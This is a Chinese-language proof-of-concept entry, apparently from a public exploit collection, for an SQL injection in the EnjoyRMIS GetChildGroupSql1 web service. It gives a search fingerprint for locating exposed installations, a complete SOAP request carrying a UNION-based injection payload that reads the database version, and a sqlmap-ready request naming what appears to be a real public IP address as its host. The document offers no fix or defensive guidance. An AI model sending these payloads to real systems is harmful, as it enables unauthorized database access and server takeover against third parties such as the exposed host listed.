# EnjoyRMIS GetChildGroupSql1存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS GetChildGroupSql1存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征


# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetChildGroupSql1"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetChildGroupSql1 xmlns="http://tempuri.org/">
      <sGuid>1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select @@version),NULL,NULL-- jhpF</sGuid>
    </GetChildGroupSql1>
  </soap:Body>
</soap:Envelope>
```


sqlmap

```plain
POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
Host: 120.78.175.218:8008
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetChildGroupSql1"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetChildGroupSql1 xmlns="http://tempuri.org/">
      <sGuid>1</sGuid>
    </GetChildGroupSql1>
  </soap:Body>
</soap:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gw589s9zgn0o9yrq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
